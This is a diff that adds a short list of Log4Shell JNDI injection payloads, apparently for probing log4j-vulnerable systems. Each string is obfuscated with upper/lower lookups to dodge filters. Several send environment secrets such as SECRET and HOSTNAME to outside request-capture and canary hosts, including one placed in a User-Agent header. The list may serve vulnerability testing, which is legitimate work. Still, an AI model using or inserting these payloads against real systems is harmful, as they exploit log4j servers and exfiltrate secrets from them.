@@ -1,0 +1,6 @@
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://requestbin.io/1nqshb41?leak=${env:SECRET:-NO_EXISTS}}
+${${upper:j}ndi:${lower:l}dap://d078793a-27ad-4bce-b3a1-dd63e488d28a.dns.log4shell.tools:12345/d078793a-27ad-4bce-b3a1-dd63e488d28a}
+${${upper:j}ndi:${lower:l}dap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/ceee0bc9-b6cc-4e8d-8437-56e691ad9ef0}
+
+User-Agent: ${${upper:j}ndi:dns://${ENV:SECRET}.x3jjvmwrflvi1py9.b.requestbin.net}}
+https://requestbin.net/bins/view/75fb914df7a803afa9e7b6c0dc1a60b104cae399
